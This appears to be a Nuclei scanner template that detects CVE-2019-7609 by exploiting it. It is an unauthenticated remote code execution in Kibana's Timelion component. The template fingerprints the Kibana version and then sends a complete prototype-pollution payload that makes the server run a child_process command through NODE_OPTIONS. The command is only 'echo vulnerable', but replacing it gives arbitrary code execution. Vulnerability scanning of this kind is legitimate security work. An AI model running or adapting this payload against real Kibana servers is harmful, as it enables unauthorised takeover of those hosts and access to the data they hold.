id: kibana-unauthorized-rce-cve-2019-7609
info:
  name: Kibana Unauthorized RCE (CVE-2019-7609)
  author: ProjectDiscoveryAI
  severity: high
  description: |
    Kibana is affected by a remote code execution vulnerability. Exploiting the flaw allows attackers to execute arbitrary commands on the server through the Timelion component using a JavaScript prototype chain pollution attack.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2019-7609
  tags: rce

variables:
  version_endpoint: "/app/kibana"
  exploit_endpoint: "/api/timelion/run"

http:
  - raw:
      - |
        GET {{BaseURL}}{{version_endpoint}} HTTP/1.1
        Host: {{Hostname}}
        Referer: {{BaseURL}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - "&quot;version&quot;:&quot;([a-zA-Z0-9.-]+)&quot;"
    extractors:
      - type: regex
        name: version
        regex:
          - "&quot;version&quot;:&quot;([a-zA-Z0-9.-]+)&quot;"
        group: 1

  - raw:
      - |
        POST {{BaseURL}}{{exploit_endpoint}} HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0
        Accept-Encoding: gzip, deflate
        Accept: */*
        Content-Type: application/json;charset=utf-8
        kbn-version: {{version}}
        Content-Length: 116

        {"sheet":[".es(*)"],"time":{"from":"now-1m","to":"now","mode":"quick","interval":"auto","timezone":"Asia/Shanghai"}}
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "timelion"
      - type: status
        status:
          - 200

  - raw:
      - |
        POST {{BaseURL}}{{exploit_endpoint}} HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0
        Accept-Encoding: gzip, deflate
        Accept: */*
        Content-Type: application/json;charset=utf-8
        kbn-version: {{version}}
        Content-Length: 404

        {"sheet":[".es(*).props(label.__proto__.env.AAAA='require(\"child_process\").exec(\"echo vulnerable\");process.exit()//')\n.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')"],"time":{"from":"now-15m","to":"now","mode":"quick","interval":"10s","timezone":"Asia/Shanghai"}}
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "vulnerable"
      - type: status
        status:
          - 200
